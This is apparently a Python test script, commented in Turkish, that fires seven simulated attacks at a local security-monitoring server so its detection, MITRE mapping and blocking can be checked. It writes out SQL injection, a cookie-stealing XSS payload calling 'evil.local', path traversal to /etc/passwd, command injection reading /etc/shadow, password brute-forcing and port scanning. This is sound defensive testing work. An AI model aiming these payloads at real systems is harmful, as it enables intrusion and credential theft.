#!/usr/bin/env python3
"""
attack_test.py

Tek bir bilgisayar üzerinde (ikinci bir cihaza ihtiyaç duymadan) 7 farklı dış
saldırgan IP adresinden geliyormuş gibi gerçek TCP/HTTP siber saldırı senaryoları üretir.

Her senaryo kendi kaynak port aralığını (44000-46000) kullanır; live_soc.py bu
aralıkları farklı dış tehdit aktörü IP'lerine eşleyerek hem Qwen Threat Validator,
hem MITRE ATT&CK Mapper hem de otonom SOAR Action Agent'ı uçtan uca test eder:

  1) SQL Injection (SQLi)         [185.220.101.46] -> Layer 2 (sql_injection)     | MITRE T1190     | WAF + IP Block
  2) Cross-Site Scripting (XSS)   [45.155.205.233] -> Layer 2 (xss)               | MITRE T1190     | WAF + IP Block
  3) Path Traversal / LFI         [91.240.118.172] -> Layer 2 (path_traversal)    | MITRE T1190     | WAF + IP Block
  4) OS Command Injection (RCE)   [193.32.162.159] -> Layer 2 (command_injection) | MITRE T1190     | WAF + IP Block
  5) HTTP Credential Brute Force  [103.145.13.88]  -> Behavior (brute_force 401)  | MITRE T1110.001 | Rate Limit + IP Block
  6) API Parameter Enum (IDOR)    [194.26.29.114]  -> Behavior (param_enum)       | MITRE T1595.002 | Rate Limit + IP Block
  7) Multi-Port TCP Service Scan  [162.142.125.10] -> Behavior + Telemetry (RST)  | MITRE T1046     | Rate Limit + IP Block

Kullanım:
  python3 attack_test.py            # Tüm 7 senaryoyu sırayla çalıştırır
  python3 attack_test.py 2 3 4      # Sadece seçilen senaryoları (örn. 2, 3 ve 4) çalıştırır
  python3 attack_test.py --list     # Senaryo listesini gösterir
"""

import http.client
import random
import socket
import sys
import time
import urllib.parse

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8765

# Port aralıkları live_soc.py içindeki SIMULATED_ATTACKER_RANGES ile birebir eşleşir
SCENARIO_PORT_RANGES = {
    1: (44000, 44299, "185.220.101.46"),
    2: (44300, 44599, "45.155.205.233"),
    3: (44600, 44899, "91.240.118.172"),
    4: (44900, 45199, "193.32.162.159"),
    5: (45200, 45499, "103.145.13.88"),
    6: (45500, 45749, "194.26.29.114"),
    7: (45750, 45999, "162.142.125.10"),
}

_port_cursors = {
    scen_id: random.randint(lo, hi - 40)
    for scen_id, (lo, hi, _) in SCENARIO_PORT_RANGES.items()
}


def _next_port(scenario_id: int) -> int:
    lo, hi, _ = SCENARIO_PORT_RANGES[scenario_id]
    cur = _port_cursors[scenario_id]
    nxt = cur + 1
    if nxt >= hi:
        nxt = lo
    _port_cursors[scenario_id] = nxt
    return cur


def send_simulated_http(
    scenario_id: int,
    method: str,
    path_and_query: str,
    body: str | None = None,
    extra_headers: dict | None = None,
    timeout: float = 3.0,
) -> int:
    headers = {
        "Host": f"{TARGET_HOST}:{TARGET_PORT}",
        "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64) RedTeamSim/{scenario_id}.0",
        "Accept": "*/*",
        "Connection": "close",
    }
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if extra_headers:
        headers.update(extra_headers)

    for _ in range(150):
        src_port = _next_port(scenario_id)
        conn = None
        try:
            conn = http.client.HTTPConnection(
                TARGET_HOST,
                TARGET_PORT,
                timeout=timeout,
                source_address=("127.0.0.1", src_port),
            )
            conn.request(
                method,
                path_and_query,
                body=body.encode("utf-8") if body is not None else None,
                headers=headers,
            )
            resp = conn.getresponse()
            resp.read(256)
            return resp.status
        except OSError as exc:
            if getattr(exc, "errno", None) in (48, 49, 98, 99):
                continue
            print(f"  [!] Bağlantı hatası ({path_and_query}): {exc}")
            return 0
        except Exception as exc:
            print(f"  [!] İstek hatası ({path_and_query}): {exc}")
            return 0
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass
    return 0


# ==========================================================
# SENARYOLAR
# ==========================================================

def scenario_1_sqli():
    ip = SCENARIO_PORT_RANGES[1][2]
    payload = "admin' UNION SELECT username,password FROM users--"
    path = "/login?user=" + urllib.parse.quote(payload)
    print(f"\n[Senaryo 1] SQL Injection (SQLi) | Saldırgan IP: {ip}")
    print(f"  -> İstek : GET {path}")
    status = send_simulated_http(1, "GET", path)
    print(f"  -> Yanıt : HTTP {status} | Beklenen: Layer-2 sql_injection + MITRE T1190 + WAF & IP Block")


def scenario_2_xss():
    ip = SCENARIO_PORT_RANGES[2][2]
    payload = "<script>fetch('http://evil.local/steal?c='+document.cookie)</script>"
    path = "/search?q=" + urllib.parse.quote(payload)
    print(f"\n[Senaryo 2] Cross-Site Scripting (XSS) | Saldırgan IP: {ip}")
    print(f"  -> İstek : GET /search?q={payload}")
    status = send_simulated_http(2, "GET", path)
    print(f"  -> Yanıt : HTTP {status} | Beklenen: Layer-2 xss + MITRE T1190 + WAF & IP Block")


def scenario_3_path_traversal():
    ip = SCENARIO_PORT_RANGES[3][2]
    payload = "../../../../etc/passwd"
    path = f"/download?file={payload}"
    print(f"\n[Senaryo 3] Path Traversal / LFI (/etc/passwd) | Saldırgan IP: {ip}")
    print(f"  -> İstek : GET {path}")
    status = send_simulated_http(3, "GET", path)
    print(f"  -> Yanıt : HTTP {status} | Beklenen: Layer-2 path_traversal + MITRE T1190 + WAF & IP Block")


def scenario_4_command_injection():
    ip = SCENARIO_PORT_RANGES[4][2]
    body = "host=127.0.0.1; cat /etc/shadow && whoami"
    path = "/api/diagnostics"
    print(f"\n[Senaryo 4] OS Command Injection (RCE) | Saldırgan IP: {ip}")
    print(f"  -> İstek : POST {path} | Body: {body}")
    status = send_simulated_http(4, "POST", path, body=body)
    print(f"  -> Yanıt : HTTP {status} | Beklenen: Layer-2 command_injection + MITRE T1190/T1059 + WAF & IP Block")


def scenario_5_credential_brute_force():
    ip = SCENARIO_PORT_RANGES[5][2]
    passwords = ["123456", "password", "admin123", "root2026", "qwerty", "letmein", "welcome1", "dragon"]
    print(f"\n[Senaryo 5] HTTP Credential Brute Force (8 Deneme) | Saldırgan IP: {ip}")
    print(f"  -> İstek : POST /api/login (user=admin, pass=123456..dragon)")
    unauthorized_count = 0
    for pwd in passwords:
        body = f"username=admin&password={pwd}"
        code = send_simulated_http(5, "POST", "/api/login", body=body)
        if code == 401:
            unauthorized_count += 1
        time.sleep(0.06)
    print(
        f"  -> Yanıt : {unauthorized_count}/{len(passwords)} adet HTTP 401 Unauthorized "
        f"| Beklenen: http_credential_brute_force + MITRE T1110.001 + Rate Limit & IP Block"
    )


def scenario_6_parameter_enumeration():
    ip = SCENARIO_PORT_RANGES[6][2]
    print(f"\n[Senaryo 6] HTTP Parameter / IDOR Enumeration (id=1..15) | Saldırgan IP: {ip}")
    print("  -> İstek : GET /api/users?id=1..15")
    ok_count = 0
    for uid in range(1, 16):
        code = send_simulated_http(6, "GET", f"/api/users?id={uid}")
        if code > 0:
            ok_count += 1
        time.sleep(0.05)
    print(
        f"  -> Yanıt : {ok_count}/15 başarılı sorgu "
        f"| Beklenen: http_parameter_enumeration + MITRE T1595.002 + Rate Limit & IP Block"
    )


def scenario_7_multi_port_scan():
    ip = SCENARIO_PORT_RANGES[7][2]
    scan_ports = [21, 22, 23, 25, 80, 445, 1433, 3306, 3389, 5432, 8765]
    print(f"\n[Senaryo 7] Multi-Port TCP Service Scan ({len(scan_ports)} Port) | Saldırgan IP: {ip}")
    print(f"  -> Taranan Portlar: {scan_ports}")
    open_ports = []
    closed_ports = []
    for dport in scan_ports:
        for _ in range(50):
            sport = _next_port(7)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            try:
                s.bind(("127.0.0.1", sport))
                res = s.connect_ex((TARGET_HOST, dport))
                if res == 0:
                    open_ports.append(dport)
                    if dport == TARGET_PORT:
                        s.sendall(b"GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
                else:
                    closed_ports.append(dport)
                break
            except OSError as exc:
                if getattr(exc, "errno", None) in (48, 49, 98, 99):
                    continue
                closed_ports.append(dport)
                break
            finally:
                try:
                    s.close()
                except Exception:
                    pass
        time.sleep(0.04)
    print(
        f"  -> Sonuç : Açık={open_ports}, Kapalı(RST)={closed_ports} "
        f"| Beklenen: multi_port_service_scan + MITRE T1046 + Rate Limit & IP Block"
    )


SCENARIOS = {
    1: ("SQL Injection (SQLi)", scenario_1_sqli),
    2: ("Cross-Site Scripting (XSS)", scenario_2_xss),
    3: ("Path Traversal / LFI", scenario_3_path_traversal),
    4: ("OS Command Injection (RCE)", scenario_4_command_injection),
    5: ("HTTP Credential Brute Force", scenario_5_credential_brute_force),
    6: ("HTTP Parameter / IDOR Enumeration", scenario_6_parameter_enumeration),
    7: ("Multi-Port TCP Service Scan", scenario_7_multi_port_scan),
}


def main():
    args = sys.argv[1:]
    if "--list" in args or "-h" in args or "--help" in args:
        print("Kullanılabilir Saldırı Senaryoları:")
        for sid, (title, _) in SCENARIOS.items():
            ip = SCENARIO_PORT_RANGES[sid][2]
            print(f"  {sid}) {title:<35} (Saldırgan IP: {ip})")
        print("\nÖrnekler:")
        print("  python3 attack_test.py          # Tüm 7 senaryoyu çalıştırır")
        print("  python3 attack_test.py 2 3 4    # Sadece XSS, Path Traversal ve Command Injection çalıştırır")
        print("  python3 attack_test.py 5 7      # Sadece Brute Force ve Port Scan çalıştırır")
        return

    selected = []
    for a in args:
        try:
            val = int(a)
            if val in SCENARIOS:
                selected.append(val)
        except ValueError:
            pass

    if not selected:
        selected = list(SCENARIOS.keys())

    print("=== MITRE SOC Çoklu Saldırı Simülatörü (7 Senaryo / 7 Farklı Dış IP) ===")
    print(f"Hedef SOC Sunucusu : {TARGET_HOST}:{TARGET_PORT}")
    print(f"Seçilen Senaryolar : {selected}")

    for idx, sid in enumerate(selected):
        _, fn = SCENARIOS[sid]
        fn()
        if idx + 1 < len(selected):
            time.sleep(1.0)

    print(
        "\n[+] Seçilen tüm saldırı senaryoları gönderildi! "
        "~10 saniye içinde live_soc.py ekranında ve Dashboard'da her saldırgan IP için "
        "farklı MITRE tekniklerini (T1190, T1110.001, T1595.002, T1046) ve SOAR aksiyonlarını görebilirsin."
    )


if __name__ == "__main__":
    main()
